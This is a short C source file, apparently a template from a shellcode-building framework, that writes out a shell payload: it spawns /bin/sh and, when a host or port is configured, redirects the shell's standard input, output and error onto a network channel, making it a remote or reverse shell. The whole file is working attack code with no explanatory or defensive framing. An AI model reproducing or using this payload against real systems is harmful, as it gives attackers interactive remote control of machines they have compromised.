#include <factory.h>

#include "helpers/process.c"
#include "helpers/io.c"
#include "helpers/socket.c"

SHELLCODE_ENTRY {

#if (SET_ARGV0 == 1)
    char *const argv[] = { "/bin/sh", NULL };
#else
    char *const argv[] = { NULL };
#endif
    char *const envp[] = { NULL };

#if (HOST != UNDEFINED_HOST) || (PORT != UNDEFINED_PORT)
    struct channel chan = get_communication_channel();
    _dup2(chan.rx, stdin);
    _dup2(chan.tx, stdout);
    _dup2(chan.tx, stderr);
#endif

    _execve("/bin/sh", argv, envp); 

} SHELLCODE_END
